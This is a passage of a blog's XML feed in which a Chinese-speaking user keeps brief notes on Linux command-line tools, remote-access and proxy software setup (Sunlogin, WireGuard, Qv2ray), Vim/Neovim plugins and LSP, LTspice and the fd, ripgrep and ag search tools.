    <link href="/2022/09/22/%E5%87%A0%E4%B8%AA%E5%A5%BD%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%BD%AF%E4%BB%B6/"/>
    <url>/2022/09/22/%E5%87%A0%E4%B8%AA%E5%A5%BD%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%BD%AF%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="cppman"><a href="#cppman" class="headerlink" title="cppman"></a>cppman</h1><p>C&#x2F;C++ 的手册.</p><h1 id="cgasm"><a href="#cgasm" class="headerlink" title="cgasm"></a>cgasm</h1><p>查询汇编指令.</p><h1 id="owncloud"><a href="#owncloud" class="headerlink" title="owncloud"></a>owncloud</h1><h1 id="ncdu"><a href="#ncdu" class="headerlink" title="ncdu"></a>ncdu</h1><p>基于 ncurses 的空间分析程序.</p><h1 id="glances"><a href="#glances" class="headerlink" title="glances"></a>glances</h1><p>替代 htop 和 top.</p><h1 id="dstat"><a href="#dstat" class="headerlink" title="dstat"></a>dstat</h1><p>替代 vmstat.</p><h1 id="cheat"><a href="#cheat" class="headerlink" title="cheat"></a>cheat</h1><p>命令行笔记.</p><h1 id="bro"><a href="#bro" class="headerlink" title="bro"></a>bro</h1><p>帮助系统.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于学长帮忙代理</title>
    <link href="/2022/09/22/%E5%85%B3%E4%BA%8E%E5%AD%A6%E9%95%BF%E5%B8%AE%E5%BF%99%E4%BB%A3%E7%90%86/"/>
    <url>/2022/09/22/%E5%85%B3%E4%BA%8E%E5%AD%A6%E9%95%BF%E5%B8%AE%E5%BF%99%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>首先讲下远程连接:</p><h1 id="向日葵"><a href="#向日葵" class="headerlink" title="向日葵"></a>向日葵</h1><p>也就是 sunloginclient 这个软件, 可以在 aur 上找到, 利用 yay 下载:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">yay -S sunloginclient</span><br></code></pre></td></tr></table></figure><p>之后需要启动 <code>runsunloginclient</code> 这个服务:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo systemctl <span class="hljs-literal">start</span> runsunloginclient<br></code></pre></td></tr></table></figure><p>打开软件后里面有两个码:</p><ul><li>识别码</li><li>验证码<br>这俩个码用于连接.</li></ul><h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><p>如果没有公网 IP, 不在同一个局域网下的主机不能够被连接到.</p><h1 id="wireguard"><a href="#wireguard" class="headerlink" title="wireguard"></a>wireguard</h1><p>看另一篇文章.</p><p>其中有一个报错:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>bin/wg-quick: line <span class="hljs-number">32</span>: resolvconf: command not found<br></code></pre></td></tr></table></figure><p>也就是说有一个命令没有被找到, 下载就好:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S resolvconf</span><br></code></pre></td></tr></table></figure><p>在 <code>sudo wg-quick up wg0</code> 操作之后, 有:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo netstat -ntpl</span><br></code></pre></td></tr></table></figure><p>的操作.</p><h1 id="qv2ray"><a href="#qv2ray" class="headerlink" title="qv2ray"></a>qv2ray</h1><p>见另一篇文章.</p><h1 id="Proxy-SwitchOmega"><a href="#Proxy-SwitchOmega" class="headerlink" title="Proxy SwitchOmega"></a>Proxy SwitchOmega</h1><p>firefox 上面下载的一个插件, 在里面配置了一部分.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-Qv2ray</title>
    <link href="/2022/09/22/%E5%85%B3%E4%BA%8E-Qv2ray/"/>
    <url>/2022/09/22/%E5%85%B3%E4%BA%8E-Qv2ray/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Qv2ray">参考 ArchWiki</a><br><a href="https://qv2ray.net/lang/zh/getting-started/step2.html#%E4%B8%8B%E8%BD%BD-v2ray-%E6%A0%B8%E5%BF%83%E6%96%87%E4%BB%B6">官方</a></p><p>Qv2ray 是一个使用 Qt 编写的跨平台的 V2Ray 图形前端, 可以在图形化界面中方便地配置代理.</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="Arch-下安装"><a href="#Arch-下安装" class="headerlink" title="Arch 下安装"></a>Arch 下安装</h2><p>需要先配置 Archlinuxcn.</p><p>安装 <code>qv2ray</code> 软件包. 对于开发版本, 安装 <code>qv2ray-dev-git</code>:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> pacman -S qv2ray-dev-git<br></code></pre></td></tr></table></figure><h2 id="Ubuntu-下"><a href="#Ubuntu-下" class="headerlink" title="Ubuntu 下"></a>Ubuntu 下</h2><p>先导入 GPG 密钥:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ curl https://qv2ray.net/debian/pubkey.gpg | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/qv2ray-stable-archive.gpg<br></code></pre></td></tr></table></figure><p>或:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ curl https://raw.fastgit.org/Qv2ray/debian/master/pubkey.gpg | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/qv2ray-stable-archive.gpg<br><br></code></pre></td></tr></table></figure><p>再添加 APT 软件源:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb [arch=amd64] https://qv2ray.net/debian/ `lsb_releases -cs` main&quot;</span> | sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/qv2ray.list<br></code></pre></td></tr></table></figure><p>更新之后就可以直接安装:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo apt update<br>$ sudo apt install qv2ray<br></code></pre></td></tr></table></figure><h1 id="配置-V2RayCore"><a href="#配置-V2RayCore" class="headerlink" title="配置 V2RayCore"></a>配置 V2RayCore</h1><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p><a href="https://qv2ray.net/lang/zh/manual/">手册</a></p><p>配置文件在 <code>~/.config/qv2ray/</code> 目录下.</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><a href="https://qv2ray.net/lang/zh/">官方文档</a>.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>栈空间分配和栈对齐访问</title>
    <link href="/2022/09/22/%E6%A0%88%E7%A9%BA%E9%97%B4%E5%88%86%E9%85%8D%E5%92%8C%E6%A0%88%E5%AF%B9%E9%BD%90%E8%AE%BF%E9%97%AE/"/>
    <url>/2022/09/22/%E6%A0%88%E7%A9%BA%E9%97%B4%E5%88%86%E9%85%8D%E5%92%8C%E6%A0%88%E5%AF%B9%E9%BD%90%E8%AE%BF%E9%97%AE/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/qinghaowusu/p/14081097.html">参考</a></p><h2 id="用户栈在系统中的位置"><a href="#用户栈在系统中的位置" class="headerlink" title="用户栈在系统中的位置"></a>用户栈在系统中的位置</h2><p>对于 Linux 内核而言, 将整个内存空间划分为两个部分, Kernel Space 和 User Space, 前者用于支撑 Linux Kernel 本身的运行所需的空间, 后者就是用于支持用户程序所需的运行空间. 用户栈就是位于用户空间, 一般位于用户空间的最高部分, 向低地址处增长.</p><p>首先有一块内存, 一片区域用来运行内核代码, 另一片区域用来给我们使用.</p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ultisnippet-和-coc-冲突</title>
    <link href="/2022/09/21/Ultisnippet-%E5%92%8C-coc-%E5%86%B2%E7%AA%81/"/>
    <url>/2022/09/21/Ultisnippet-%E5%92%8C-coc-%E5%86%B2%E7%AA%81/</url>
    
    <content type="html"><![CDATA[<p>因为两个插件的默认展开键都是 <tab>, 因此, 将 <code>Ultisnippet</code> 的展开键更换就好.</p><p>使用 <code>:verbose</code> 命令查看:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">verbose</span> <span class="hljs-keyword">imap</span> <span class="hljs-symbol">&lt;tab&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>vim-中几个插件的使用</title>
    <link href="/2022/09/20/vim-%E4%B8%AD%E5%87%A0%E4%B8%AA%E6%8F%92%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/20/vim-%E4%B8%AD%E5%87%A0%E4%B8%AA%E6%8F%92%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="vim-startify"><a href="#vim-startify" class="headerlink" title="vim-startify"></a>vim-startify</h1><p>提供一个 vim 和 nvim 的 start 界面.</p><p>可配置, 具体看 <a href="https://github.com/mhinz/vim-startify/wiki/Example-configurations">github 相关</a>.</p><h1 id="SimpylFold"><a href="#SimpylFold" class="headerlink" title="SimpylFold"></a>SimpylFold</h1><p>用于折叠 python 代码.</p><p>有部分配置选项, 具体看 <a href="https://github.com/tmhedberg/SimpylFold">github 相关</a>.</p><p>使用上还是用 vim 原来的 <code>zc</code> 来 close a fold, <code>zo</code> 来 open one.</p><p>通过 <code>:help fold-commands</code> 来查看相关信息.</p><h1 id="tcomment-vim"><a href="#tcomment-vim" class="headerlink" title="tcomment_vim"></a>tcomment_vim</h1><p>可以将一段文本注释掉, 以及取消注释.</p><p>如果 file-type 功能正常工作, TComment 就知道用什么符号来注释文本.</p><p>具体按键看 init.vim.</p><h1 id="Semshi"><a href="#Semshi" class="headerlink" title="Semshi"></a>Semshi</h1><p>具体看 <a href="https://github.com/numirias/semshi">github 相关</a>.</p><p>在 neovim 中提供 Python 的语法高亮. 需要后缀为 <code>.py</code> 的文件.</p><h1 id="vim-illuminate"><a href="#vim-illuminate" class="headerlink" title="vim-illuminate"></a>vim-illuminate</h1><p>用来高亮 cursor 下的 word.</p><p>默认是用 <code>&lt;a-n&gt;</code> 和 <code>&lt;a-p&gt;</code> 来在 references 之间移动.</p><h1 id="vim-diff-和-vim-diff-enhanced"><a href="#vim-diff-和-vim-diff-enhanced" class="headerlink" title="vim-diff 和 vim-diff-enhanced"></a>vim-diff 和 vim-diff-enhanced</h1><h1 id="vim-projectionist"><a href="#vim-projectionist" class="headerlink" title="vim-projectionist"></a>vim-projectionist</h1><h1 id="nerdtree-的配置"><a href="#nerdtree-的配置" class="headerlink" title="nerdtree 的配置"></a>nerdtree 的配置</h1><h1 id="vim-which-key"><a href="#vim-which-key" class="headerlink" title="vim-which-key"></a>vim-which-key</h1><h1 id="vim-gruvbox"><a href="#vim-gruvbox" class="headerlink" title="vim-gruvbox"></a>vim-gruvbox</h1><p>在官网上查看可以设置的变量.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-中关于-neovim</title>
    <link href="/2022/09/20/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-neovim/"/>
    <url>/2022/09/20/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-neovim/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Neovim">ArchWiki</a></p><p>Neovim 是 vim 的一个 fork.</p><p>Neovim 非常建议使用 Lua 来配置.</p><p>为了使系统的 clipboard 有效, 需要下载 xclip (X11) 或 wl-clipboard (Wayland).</p><p>使用 Lua 可以有 init.lua 配置文件.</p><h2 id="Language-Server-Protocol"><a href="#Language-Server-Protocol" class="headerlink" title="Language Server Protocol"></a>Language Server Protocol</h2><p>Neovim 有内置的 Language Server Protocol client 和 <code>nvim-lspconfig</code> 这个插件来提供一般的 configuration.</p><p>wiki 上面有 Language Server 的相关包.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是-LSP</title>
    <link href="/2022/09/20/%E4%BB%80%E4%B9%88%E6%98%AF-LSP/"/>
    <url>/2022/09/20/%E4%BB%80%E4%B9%88%E6%98%AF-LSP/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/u012930117/article/details/79291677">参考</a><br>LSP 是 Language Server Protocol, 语言服务器协议. 是一种用于编辑器或集成开发环境与支持比如自动补全, 定义跳转, 查找所有引用等语言特性的语言服务器之间的一种协议.</p><p>语言服务器 (Language Server) 是一台&#x2F;组提供了检查语言特性的服务器. 其为了解决不同 IDE 的插件编写方案不同的问题.</p><p>只要编辑器支持 Language Server, 就能利用这个 Server 的效果.</p><p>Language Server 的响应效果可以不同.</p><p>可以添加支持某种编程语言的服务器配置.</p><h1 id="参考-官网"><a href="#参考-官网" class="headerlink" title="参考 官网"></a>参考 <a href="https://microsoft.github.io/language-server-protocol/specifications/specification-3-16/#whatIsNew">官网</a></h1>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-vim-中的补全插件</title>
    <link href="/2022/09/20/%E5%85%B3%E4%BA%8E-vim-%E7%9A%84%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E6%8F%92%E4%BB%B6/"/>
    <url>/2022/09/20/%E5%85%B3%E4%BA%8E-vim-%E7%9A%84%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/ycm-core/YouCompleteMe">YouCompleteMe github 页面</a><br><a href="https://github.com/neoclide/coc.nvim">coc github 页面</a></p><h1 id="coc"><a href="#coc" class="headerlink" title="coc"></a>coc</h1><p>更多信息在 github 的 wiki 上.</p><p>在 vim 中用 <code>:h coc-nvim</code> 查看.</p><p>Coc.nvim 是大部分用 TypeScript 编写且运行在 Node.js 上的插件.</p><p>安装:</p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sml"><span class="hljs-type">Plug</span> <span class="hljs-symbol">&#x27;neoclide</span>/coc.nvim&#x27;, &#123;<span class="hljs-symbol">&#x27;branch&#x27;</span>: <span class="hljs-symbol">&#x27;release&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>这里使用 vim-plug 插件管理.</p><p>可以用 <code>:checkhealth</code> 来查看是否正常工作.</p><p>设置 <code>g:coc_node_path</code> 变量来特指一个 <code>node</code> 来打开 coc.nvim 服务.</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>coc 可以扩展, 通过下载 coc extension 或者 confugure language servers for LSP support.</p><p>下载扩展:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:CocInstall</span> coc-json coc-tsserver<br></code></pre></td></tr></table></figure><p>这里就下载了 json 和 tsserver 的支持.</p><p>configure language server 在 <code>~/.config/nvim/coc-settings.json</code> 这个文件, 可以通过 <code>:CocConfig</code> 这个文件来打开:</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>  <span class="hljs-string">&quot;languageserver&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;go&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;command&quot;</span>: <span class="hljs-string">&quot;gopls&quot;</span>,<br>      <span class="hljs-string">&quot;rootPatterns&quot;</span>: [<span class="hljs-string">&quot;go.mod&quot;</span>],<br>      <span class="hljs-string">&quot;trace.server&quot;</span>: <span class="hljs-string">&quot;verbose&quot;</span>,<br>      <span class="hljs-string">&quot;filetypes&quot;</span>: [<span class="hljs-string">&quot;go&quot;</span>]<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过 <code>:verbose imap &lt;tab&gt;</code> 查看 keymap 是否其作用.</p><h2 id="参考视频配置"><a href="#参考视频配置" class="headerlink" title="参考视频配置"></a>参考视频配置</h2><p><a href="https://b23.tv/D7s5stb">参考</a><br>安装用 <code>:CocInstall</code>, 卸载用 <code>:CocUninstall</code>.</p><p>查看安装了哪些插件, 用 <code>:CocList extensions</code></p><p>利用 coc 的方式管理插件, 在 <code>init.vim</code> 文件中写:</p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sml"><span class="hljs-keyword">let</span> g:coc_global_extensions = [<span class="hljs-symbol">&#x27;coc</span>-json&#x27;, <span class="hljs-symbol">&#x27;coc</span>-vimlsp&#x27;]<br></code></pre></td></tr></table></figure><p>以上就会用来安装这两个 coc 的插件.</p><p>coc-marketplace, 这个插件可以用来发现 coc 插件. 通过 <code>:CocList marketplace</code> 来使用.</p><p>还有几个插件, coc-explore, coc-translate, coc-snippets</p><h3 id="写-coc-插件"><a href="#写-coc-插件" class="headerlink" title="写 coc 插件"></a>写 coc 插件</h3><p>在 github 搜 <code>create coc extensions</code></p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Practical Vim Notes</title>
    <link href="/2022/09/20/Practical%20Vim%20Notes/"/>
    <url>/2022/09/20/Practical%20Vim%20Notes/</url>
    
    <content type="html"><![CDATA[<h2 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h2><p><code>viw</code> 中的 <code>i</code> 是 in 的意思, 这里就是 <code>in word</code>.</p><h3 id="exec-命令"><a href="#exec-命令" class="headerlink" title="exec 命令"></a>exec 命令</h3><p>格式:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><code>&quot;&quot;</code> 里面是在 <code>:</code> 中执行的指令.</p><h3 id="设置-ignorecase"><a href="#设置-ignorecase" class="headerlink" title="设置 ignorecase"></a>设置 ignorecase</h3><p>设置之后, 你在 <code>:</code> 后面的命令也会忽略大小写.</p><h3 id="normal-模式下的-zz-指令"><a href="#normal-模式下的-zz-指令" class="headerlink" title="normal 模式下的 zz 指令"></a>normal 模式下的 zz 指令</h3><p>把光标下的那一行变成中心列.</p><h3 id="多行执行命令"><a href="#多行执行命令" class="headerlink" title="多行执行命令"></a>多行执行命令</h3><p>先在可视模式下选中文本, 然后按出冒号 <code>:</code>, 就可以对选中的文本逐行执行命令.</p><h3 id="执行宏命令"><a href="#执行宏命令" class="headerlink" title="执行宏命令"></a>执行宏命令</h3><p>比如存在 <code>a</code> 这个寄存器里面, 使用 <code>@a</code> 来执行, 不需要冒号 <code>:</code>.</p><h3 id="在-nvim-下执行代码"><a href="#在-nvim-下执行代码" class="headerlink" title="在 nvim 下执行代码"></a>在 nvim 下执行代码</h3><p>分屏后, 通过 <code>:term</code> 打开一个终端.</p><h2 id="16-ctags建立索引"><a href="#16-ctags建立索引" class="headerlink" title="16 ctags建立索引"></a>16 ctags建立索引</h2><h3 id="102-ctags"><a href="#102-ctags" class="headerlink" title="102 ctags"></a>102 ctags</h3><p>在C文件中的作用大抵是从函数名跳转到其定义处，感觉只有文件多的时候才有作用。</p><p>Vim会为标签文件的所有关键字提供tab补全功能, 不是写代码的时候自动补全，而是用tag查找时。</p><p>使用<code>:tag</code>和<code>:tjump</code>跳转，可与正则表达式结合，如</p><pre><code class="hljs">:tag /&#123;pattern&#125;</code></pre><hr><h4 id="标签文件"><a href="#标签文件" class="headerlink" title="标签文件"></a>标签文件</h4><p>只是一个纯文本文件。</p><p>前几行是元数据，我理解为自动生成的注释，里面写了作者，版本这类信息。</p><p>后面每一行包括三部分，关键字、文件名和关键字在源文件中的位置。有一个元数据作为标记，比如c表示class，d表示define。</p><hr><h4 id="查找方式"><a href="#查找方式" class="headerlink" title="查找方式"></a>查找方式</h4><p>使用查找命令<code>/</code></p><hr><h4 id="标签文件的位置"><a href="#标签文件的位置" class="headerlink" title="标签文件的位置"></a>标签文件的位置</h4><p>Read <code>:help tags</code><br>Read <code>:help tags-option</code></p><p><code>.\</code>会被替换为当前路径。</p><p>使用<code>:set tags?</code>来查看，输出如</p><pre><code class="hljs">tags=./tags,./TAGS,tags,TAGS</code></pre><p>前面<code>./tags</code>就表示当前路径下的tags文件，<code>,</code>用于分隔。vim通过这个来查找标签文件的位置。若在一个标签文件中没有找到，就会找下一个。</p><hr><h4 id="生成标签文件"><a href="#生成标签文件" class="headerlink" title="生成标签文件"></a>生成标签文件</h4><p>在Vim中</p><pre><code class="hljs">:ctags -R</code></pre><p>从当前目录开始，遍历所有的子目录，为其中的每一个文件建立索引。</p><p>可选映射</p><pre><code class="hljs">:nnoremap &lt;f5&gt; :!ctags -R&lt;cr&gt;</code></pre><hr><h4 id="自动更新标签文件"><a href="#自动更新标签文件" class="headerlink" title="自动更新标签文件"></a>自动更新标签文件</h4><p>如</p><pre><code class="hljs">:autocmd BufWritePost * call system(“ctags -R”)</code></pre><hr><h4 id="通过版本控制工具的回调机制自动执行ctags"><a href="#通过版本控制工具的回调机制自动执行ctags" class="headerlink" title="通过版本控制工具的回调机制自动执行ctags"></a>通过版本控制工具的回调机制自动执行ctags</h4><p>参见Tim Pope的《Effortless Ctags with Git》    </p><hr><h4 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h4><p><code>&lt;C-]&gt;</code>即<code>Ctrl+]</code>, 从光标所在处跳转。</p><p><code>&lt;C-t&gt;</code>，回到上一次跳转的目标。</p><hr><p>Read <code>:help tag-stack</code></p><hr><h4 id="匹配标签的优先级"><a href="#匹配标签的优先级" class="headerlink" title="匹配标签的优先级"></a>匹配标签的优先级</h4><p>Read <code>:help tag-priority</code></p><hr><h4 id="多处匹配"><a href="#多处匹配" class="headerlink" title="多处匹配"></a>多处匹配</h4><p>使用<code>g&lt;C-]&gt;</code>感觉g是global的意思。</p><p><code>:tselect</code>调出标签匹配列表。</p><p>参考unimpaired插件。</p><hr><h4 id="可用命令"><a href="#可用命令" class="headerlink" title="可用命令"></a>可用命令</h4><p><img src="/media/16558126770508.jpg"></p><h2 id="17-编译代码及quickfix"><a href="#17-编译代码及quickfix" class="headerlink" title="17 编译代码及quickfix"></a>17 编译代码及quickfix</h2><h3 id="105-编译代码"><a href="#105-编译代码" class="headerlink" title="105 编译代码"></a>105 编译代码</h3><p>使用<code>:make</code>, 其作用和 shell 中使用 make 命令一样, 且会提取信息. 这个命令会让你跳转到第一处报错的地方, 使用 <code>:make!</code> 则不会跳转.</p><p>用 <code>:h quickfix</code> 查看 quickfix 的文档.</p><p>使用 <code>:cnext</code> 跳转到下一个位置, <code>&lt;C-o&gt;</code> 会到上一处位置.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LTspice-使用</title>
    <link href="/2022/09/19/LTspice-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/19/LTspice-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="助教视频"><a href="#助教视频" class="headerlink" title="助教视频"></a>助教视频</h1><p><code>&lt;C-r&gt;</code> 调整水平放置还是竖直放置. 滚轮可以缩放大小. <code>&lt;C-e&gt;</code> 也有颠倒功能. </p><p>使用 <code>&lt;esc&gt;</code> 退出一个元器件的布置.</p><p>使用电源需要搜索.</p><p>按 <code>&lt;delete&gt;</code> 键会出现一把剪刀, 可以用来删除元器件.</p><p>通过右键可以修改名称和阻值.</p><h1 id="其他教程"><a href="#其他教程" class="headerlink" title="其他教程"></a>其他教程</h1><p><a href="https://zhuanlan.zhihu.com/p/57983635?utm_source=qq">知乎1</a><br><a href="https://zhuanlan.zhihu.com/p/57983635">知乎2</a></p><h1 id="在-ArchLinux-上的安装和使用"><a href="#在-ArchLinux-上的安装和使用" class="headerlink" title="在 ArchLinux 上的安装和使用"></a>在 ArchLinux 上的安装和使用</h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">yay -S ltspice</span><br></code></pre></td></tr></table></figure><p>然后就会安装.</p><p>用 dmenu 无法打开, 可在命令行输入:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ltspice</span><br></code></pre></td></tr></table></figure><p>然后可以打开.</p>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-ag-fd-和-ripgrep-命令</title>
    <link href="/2022/09/19/%E5%85%B3%E4%BA%8E-ag-fd-%E5%92%8C-ripgrep-%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/09/19/%E5%85%B3%E4%BA%8E-ag-fd-%E5%92%8C-ripgrep-%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1><p><a href="https://github.com/sharkdp/fd">github 相关位置</a><br>查看 readme 文件.</p><p><code>fd</code> 是一个查找命令, It is a simlpe, fast and user-friendly alternative to find.</p><p>其默认会忽略 hidden directories and files, 以及 <code>.gitignore</code> 里面的文件.</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>同样是用 <code>fd -h</code> 或 <code>fd --help</code> 查看可用选项.</p><p>可直接跟关键词, 其会输出所有含有该关键词的文件名, 会递归查找.</p><p>没有参数时递归输出所有文件.</p><h3 id="利用-regex-查找"><a href="#利用-regex-查找" class="headerlink" title="利用 regex 查找"></a>利用 regex 查找</h3><p>regex 放在 <code>&#39;&#39;</code> 之中:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">fd</span> <span class="hljs-string">&#x27;^x.*rc$&#x27;</span><br></code></pre></td></tr></table></figure><p><a href="https://docs.rs/regex/1.0.0/regex/#syntax">支持的 regex 文档</a></p><h3 id="指定目录查找"><a href="#指定目录查找" class="headerlink" title="指定目录查找"></a>指定目录查找</h3><p>第一个参数放要查找的文件名, 目录名放在第二个参数位置.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fd passwd /etc<br></code></pre></td></tr></table></figure><h3 id="查找指定后缀"><a href="#查找指定后缀" class="headerlink" title="查找指定后缀"></a>查找指定后缀</h3><p>使用 <code>-e</code> 即 <code>--extension</code> 选项:</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">fd -e <span class="hljs-built_in">md</span><br></code></pre></td></tr></table></figure><p>也可以指定文件名:</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">fd -e <span class="hljs-built_in">md</span> filename<br></code></pre></td></tr></table></figure><h2 id="和-fzf-配合"><a href="#和-fzf-配合" class="headerlink" title="和 fzf 配合"></a>和 <code>fzf</code> 配合</h2><h1 id="ripgrep-rg"><a href="#ripgrep-rg" class="headerlink" title="ripgrep (rg)"></a>ripgrep (rg)</h1><p>ripgrep 会用 regex pattern 递归查找当前目录.</p><p>默认情况下, ripgrep 会参考 <code>.gitignore</code> 文件并且忽略隐藏文件&#x2F;目录.</p><h2 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h2><p><a href="https://github.com/BurntSushi/ripgrep/blob/master/GUIDE.md">手册</a></p><h1 id="The-Silver-Searcher-ag"><a href="#The-Silver-Searcher-ag" class="headerlink" title="The Silver Searcher (ag)"></a>The Silver Searcher (ag)</h1><p>这个查找的是文件里面的内容而不是文件名.</p><p>可以指定相关文件名并查找里面的内容:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">ag -G manager <span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p>文件名中包含 <code>manager</code>, 文件中包含 <code>class</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
